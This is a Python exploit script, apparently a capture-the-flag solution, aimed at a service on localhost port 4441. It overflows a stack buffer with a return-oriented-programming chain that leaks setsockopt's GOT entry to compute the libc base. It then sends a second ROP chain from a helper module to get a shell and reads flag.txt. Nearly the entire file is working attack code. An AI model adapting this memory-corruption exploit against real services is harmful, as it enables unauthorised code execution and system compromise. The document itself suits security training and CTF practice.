import sys
import socket
from struct import pack
from struct import unpack
import mkrop



def p(a):
	struct.pack('Q', a)

address = 'localhost'
port = 4441

s = socket.create_connection((address, port))

padding = b'A' * (0x20 + 8)

setsockopt_got = pack('Q', 0x4033c0)

pop_rsi_r15 = pack('Q', 0x4014a9)

pop_rdi = pack('Q', 0x4014ab)

setsockopt_offset = 0xff410

fork_plt = pack('Q', 0x401100)

useful_gadgets = pack('Q', 0x401206)    #add r15, rdi

fork_got = pack('Q', 0x403428)

off = 0xeef20 -  0xcb470
offset = pack('Q', off)

r = padding
r += pop_rdi 
r += offset
r += pop_rsi_r15
r += setsockopt_got
r += fork_got
r += useful_gadgets
r += pop_rdi
r += pack('Q', 1)
r += fork_plt
r += b'B' * (0x200 - len(r))
s.send(r)
result = s.recv(8)
#sys.stdout.buffer.write(result)

setsockopt_libc = unpack('Q', result)[0]

s.close()
libc = setsockopt_libc - setsockopt_offset  

s = socket.create_connection((address, port))

o = mkrop.rop(padding, libc)
o += b'K' * (0x200 - len(o))

s.send(o)
#s.recv(0x200)

s.send(b'/bin/cat flag.txt\n')

sys.stdout.buffer.write(s.recv(0x200))




